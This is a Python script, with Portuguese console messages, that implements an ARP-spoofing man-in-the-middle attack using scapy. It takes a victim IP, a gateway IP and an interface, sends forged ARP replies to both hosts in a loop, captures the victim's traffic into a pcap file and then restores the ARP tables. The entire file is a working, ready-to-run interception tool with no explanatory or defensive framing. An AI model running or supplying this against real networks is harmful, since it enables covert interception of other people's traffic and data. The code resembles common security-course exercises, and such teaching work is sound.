from multiprocessing import Event, Process
from scapy.all import (ARP, Ether, conf, get_if_hwaddr, 
                       send, sniff, sndrcv, srp, wrpcap,sendp)
import os
import sys
import time

is_done = False

def get_mac(target_ip):
    packet = Ether(dst='ff:ff:ff:ff:ff:ff')/ARP(op='who-has', pdst=target_ip)
    resp, _ = srp(packet, timeout=2, verbose=False)
    for _, r in resp:
        return r[Ether].src
    return None

class Arper:
    def __init__(self, victim, gateway, interface='Wi-fi'):
        self.victim = victim
        self.victimmac = get_mac(victim)
        self.gateway = gateway
        self.gatewaymac = get_mac(gateway)
        self.interface = interface
        conf.iface = interface
        conf.verb = 0
        self.stop_event = Event()
        
        print(f'{interface} inicializada:')
        print(f'Gateway ({gateway}) está em {self.gatewaymac}')
        print(f'Vítima ({self.victim}) está em {self.victimmac}')
        print('-'*30)
    
    def run(self):
        poison_thread = Process(target=self.poison, args=(self.stop_event,))
        poison_thread.start()
        
        sniff_thread = Process(target=self.sniff, args=(10,))
        sniff_thread.start()
        
        poison_thread.join()
        sniff_thread.join()
 

    def poison(self, stop_event):
        poison_victim = ARP()
        poison_victim.op = 2
        poison_victim.psrc = self.gateway
        poison_victim.pdst = self.victim
        poison_victim.hwdst = self.victimmac
        poison_victim.hwsrc = get_if_hwaddr(self.interface)
        print(f'IP de origem: {poison_victim.psrc}')
        print(f'IP de destino: {poison_victim.pdst}')
        print(f'MAC de destino: {poison_victim.hwdst}')
        print(f'MAC de origem: {poison_victim.hwsrc}')
        print(poison_victim.summary())
        print('-'*30)
        
        poison_gateway = ARP()
        poison_gateway.op = 2
        poison_gateway.psrc = self.victim
        poison_gateway.pdst = self.gateway
        poison_gateway.hwdst = self.gatewaymac
        poison_gateway.hwsrc = get_if_hwaddr(self.interface)
        print(f'IP de origem: {poison_gateway.psrc}')
        print(f'IP de destino: {poison_gateway.pdst}')
        print(f'MAC de destino: {poison_gateway.hwdst}')
        print(f'MAC de origem: {poison_gateway.hwsrc}')
        print(poison_gateway.summary())
        print('-'*30)
        
        print(f'Iniciando o envenenamento ARP. [CTRL+C para interromper]')
        while not stop_event.is_set():
            sys.stdout.write('.')
            sys.stdout.flush()
            try:
                sendp(Ether(dst=self.victimmac)/poison_victim, verbose=False)
                sendp(Ether(dst=self.gatewaymac)/poison_gateway, verbose=False)
                time.sleep(2)
            except KeyboardInterrupt:
                self.restore()
                stop_event.set()
                sys.exit()
                break
        sys.exit()
        
    
    def sniff(self, count=100):
        time.sleep(5)
        print(f'Capturando {count} pacotes')
        bpf_filter = "ip host %s" % self.victim
        packets = sniff(count=count, filter=bpf_filter, iface=self.interface)
        wrpcap('arper.pcap', packets)
        print('Pacotes recebidos')
        self.restore()
        self.stop_event.set()
        print('Concluido')
    
    def restore(self):
        sendp(ARP(
            op=2,
            psrc=self.gateway,
            hwsrc=self.gatewaymac,
            pdst=self.victim,
            hwdst='ff:ff:ff:ff:ff:ff'),
            count=5, verbose=False)           
        
        sendp(ARP(
            op=2,
            psrc=self.victim,
            hwsrc=self.victimmac,
            pdst=self.gateway,
            hwdst='ff:ff:ff:ff:ff:ff'),
            count=5, verbose=False)       
        print('\n\n\n\n\nRestaurando tabelas ARP...\n\n\n\n')

    
if __name__ == '__main__':
    (victim, gateway, interface) = (sys.argv[1], sys.argv[2], sys.argv[3])
    myarp = Arper(victim, gateway, interface)
    myarp.run()